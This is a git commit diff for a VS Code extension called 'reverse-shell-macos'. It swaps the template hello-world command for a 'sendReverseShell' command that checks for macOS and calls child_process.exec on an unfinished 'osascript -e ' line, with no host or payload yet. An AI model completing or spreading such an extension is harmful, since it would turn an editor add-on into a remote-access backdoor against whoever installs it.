f3e83ea61d2007ebd12e53baabcae66ee8302871
George <48719453+geoe9@users.noreply.github.com>
2023-05-03 18:11:42 +0100

    Update reverse-shell-macos

--- reverse-shell-macos/src/extension.ts
+++ reverse-shell-macos/src/extension.ts
@@ -1,26 +1,18 @@
-// The module 'vscode' contains the VS Code extensibility API
-// Import the module and reference it with the alias vscode in your code below
 import * as vscode from 'vscode';
+import { platform } from 'node:process';
+import * as cp from 'node:child_process';
 
-// This method is called when your extension is activated
-// Your extension is activated the very first time the command is executed
 export function activate(context: vscode.ExtensionContext) {
 
-	// Use the console to output diagnostic information (console.log) and errors (console.error)
-	// This line of code will only be executed once when your extension is activated
-	console.log('Congratulations, your extension "reverse-shell-macos" is now active!');
+	let command = vscode.commands.registerCommand('reverse-shell-macos.sendReverseShell', () => {
+		
+		if (platform !== "darwin") { console.error("Error: Not running on MacOS"); return; }
+		
+		cp.exec("osascript -e ");
 
-	// The command has been defined in the package.json file
-	// Now provide the implementation of the command with registerCommand
-	// The commandId parameter must match the command field in package.json
-	let disposable = vscode.commands.registerCommand('reverse-shell-macos.helloWorld', () => {
-		// The code you place here will be executed every time your command is executed
-		// Display a message box to the user
-		vscode.window.showInformationMessage('Hello World from reverse-shell-macos!');
 	});
 
-	context.subscriptions.push(disposable);
+	context.subscriptions.push(command);
 }
 
-// This method is called when your extension is deactivated
 export function deactivate() {}
